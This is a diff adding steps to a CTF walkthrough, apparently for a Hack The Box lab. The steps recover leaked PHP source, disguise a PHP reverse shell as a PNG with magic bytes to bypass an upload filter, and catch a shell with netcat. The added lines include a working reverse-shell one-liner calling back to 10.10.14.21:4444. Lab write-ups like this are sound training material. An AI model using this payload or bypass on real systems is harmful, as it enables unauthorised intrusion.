@@ -43,10 +43,48 @@ gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/02cf635c-1554-499f-a6ce-f996bf402e30)
 
-+ Next, visit the **backup** directory. It contains a compressed file.
++ Next, visit the **backup** directory. It contains a compressed file **backup.tar**.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6e294d32-8a7e-4eda-9d1f-28aca1301525)
 
++ Download the file and decompress it: `tar xvf backup.tar -C backup/`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ba492160-c355-46dd-bc06-b00b24a19f43)
+
++ It contains the source code of the php scripts running on the web server.
++ Check the code of **upload.php** file.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0d3c93b1-9f06-44ee-90ad-e9343923f5f9)
+
++ Check the code of **lib.php** file.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a8475de9-9279-40ed-9af0-2ed8d1f9653c)
+
++ Create a reverse shell **.php** file as **shell.php**, and then add one more extension as **.png** after **.php**. 
+```
+<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'"); ?>
+```
+
++ Change mimetype adding `89 50 4E 47 0D 0A 1A 0A`: `hexeditor shell.php.png`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/71cabbb6-1269-4caf-8bcf-5b7d21c08e66)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2d5de695-c5d2-4741-a1d8-9bdf5ac426de)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f4e866d8-6b68-48b3-aed8-d27ce2246be3)
+
++ Upload it using browse button, and go.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0112f4c1-0efc-4e41-b887-bf7883ba8dd8)
+
++ Start netcat listener on the attack machine: `nc -lnvp 4444`
++ Go to the **http://10.10.10.146/photos.php** that is discovered on the first directory fuzzing.
++ Image is broken, and right click "Copy Image Link".
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3353dfb5-a45a-41f1-aa91-5f73d47e566b)
+
++ Navigate to `10.10.10.146/uploads/10_10_14_21.php.png`.
++ Get low level shell, and see the **web daemon user (www-data)**'s privilege is **not** enough to view the content of the user flag.
 
 
 
